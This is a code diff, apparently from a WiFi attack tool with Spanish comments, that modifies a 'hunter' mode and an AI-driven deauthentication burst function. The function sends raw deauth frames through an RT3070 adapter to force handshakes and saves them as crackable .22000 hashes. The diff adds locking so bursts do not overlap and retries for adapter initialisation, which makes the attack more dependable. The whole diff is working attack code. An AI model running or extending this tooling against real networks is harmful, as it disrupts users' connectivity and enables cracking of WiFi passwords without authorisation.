@@ -823,6 +823,10 @@ function stopHunter(reason) {
 }
 function startHunter(bssid, ssid, channel) {
   if (!bssid) { log('[cazador] sin objetivo: no arranca.', 'warn'); return; }
+  if (attackIsBusy() || window._simpleOrchestrating) {
+    log('[cazador] no arranca: hay un ataque en curso (evitando TX solapado).', 'warn');
+    return;
+  }
   stopHunter();
   window._hunterActive = true;
   window._hunterStopRequested = false;
@@ -1497,6 +1501,13 @@ window.iaDeauthBurst = async function (args) {
   const ch = parseInt(args.channel) || selectedChannel() || 0;
   const da = args.target_mac || null;
   if (!bssid || !ch) throw new Error('deauth_burst sin BSSID/canal válido');
+  // Un único stream de TX: nunca solapar ráfagas del cazador y del ataque IA.
+  if (window._deauthRunning) {
+    log('[deauth] ya hay una ráfaga en curso; esta se omite.', 'warn');
+    return { success: false, message: 'TX ocupado por otra ráfaga', passes: 0 };
+  }
+  window._deauthRunning = true;
+  try {
   const rep = await window.__invoke('detect_adapters');
   const ad = ((rep && rep.adapters) || []).find(a => a.guid && (a.monitor_active || a.monitor_capable));
   if (!ad) throw new Error('sin adaptador monitor para la captura');
@@ -1524,12 +1535,23 @@ window.iaDeauthBurst = async function (args) {
   // 4 pasadas × 2 frames = 8 frames broadcast (o 5 dirigidos: 3×2).
   const framesPerPass = 2;
   const maxPasses = args.sustained ? 20 : (da ? 3 : 4);
-  let passes = 0;
+  let passes = 0, initFails = 0;
   while (!window._eapolSeen && passes < maxPasses) {
     if (window._simpleStop || (args._hunter && window._hunterStopRequested)) break;
     try {
       const ini = await window.__invoke('usb_raw_init', { channel: ch });
-      if (!(ini && ini.success)) log('[deauth] aviso init: ' + ((ini && ini.message) || '?'), 'warn');
+      if (!(ini && ini.success)) {
+        initFails++;
+        log('[deauth] init falló (' + (ini && ini.message) + '): ' +
+          String((ini && ini.output) || '').split('\n').filter(l => l.trim()).slice(-3).join(' | '), 'warn');
+        if (initFails >= 3) {
+          log('[deauth] 3 fallos de init seguidos: paro de transmitir. Si el chip no responde, power-cycle físico del RT3070 (15 s).', 'error');
+          break;
+        }
+        await new Promise(res => setTimeout(res, 1500));
+        continue;
+      }
+      initFails = 0;
       const r = await window.__invoke('usb_raw_deauth', {
         bssid, channel: ch, count: framesPerPass, target_mac: da, reason: 7, delay_ms: 100,
       });
@@ -1556,6 +1578,7 @@ window.iaDeauthBurst = async function (args) {
     passes,
     message: ok ? '⚡ .22000 válido con ' + total + ' hash(es) + pcapng crudo guardado.' : 'EAPOL visto pero sin hash crackeable en la conversión (reintentar).',
   };
+  } finally { window._deauthRunning = false; }
 };
 
 // ── E0-24 fase C: auto-gatillo M1/M2 para APs sin clientes ──────────────────
